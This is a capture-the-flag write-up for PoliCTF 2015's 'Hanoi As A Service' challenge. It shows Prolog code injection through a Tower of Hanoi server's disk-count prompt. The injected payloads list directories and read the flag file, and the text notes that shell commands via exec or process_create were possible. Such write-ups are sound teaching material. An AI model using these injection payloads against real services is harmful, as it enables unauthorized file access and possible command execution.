## Hanoi As A Service, Pwnable 50

One of the easiest challenges of PoliCTF 2015 and the first we solved. The challenge's description pointed us to "haas.polictf.it 80". Netcating in we found a Tower of Hanoi server:

{% highlight php %}
host$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
3
* Move top disk from a to b
* Move top disk from a to c
* Move top disk from b to c
* Move top disk from a to b
* Move top disk from c to a
* Move top disk from c to b
* Move top disk from a to b
{% endhighlight %}


Can we get an error? Let's try '-1':

{% highlight php %}
host$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
-1
ERROR: Prolog initialisation failed:
ERROR: Out of local stack
{% endhighlight %}

Ah! Prolog, I knew there was a point to studying it back in college. Can we inject some code?

{% highlight php %}
host:john-pastry-shop tpc$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
1),write('hello world'
* Move top disk from a to b
hello world
{% endhighlight %}

So we can inject commands.  Next we googled for any and all Prolog commands that might be useful. '1),listing,write(\'hello\'' displays the entire prolog database, but there is nothing really useful there. Instead we can have a look at the files using: '1),directory_files(<dir>,X),write(X', until we find the flag:

{% highlight php %}
host$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
1),directory_files('home/ctf/haas',X),write(X
* Move top disk from a to b
[haas-proxy.py,..,jhknsjdfhef_flag_here,haas,.]
{% endhighlight %}

Now we know were the flag is we can print off the ascii: 

{% highlight php %}
host:john-pastry-shop tpc$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
1),open('/home/ctf/haas/jhknsjdfhef_flag_here',read,Str),read_line_to_codes(Str,X),write(X
* Move top disk from a to b
[102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
{% endhighlight %}

which https://paulschou.com/tools/xlate/ tell us encodes: 'flag{Pr0gramm1ng_in_l0g1c_1s_c00l}'.

Executing shell commands or even opening a shell would have been possible with Prologs 'exec' or 'process_create' commands, but that seemed like overkill in this situation.
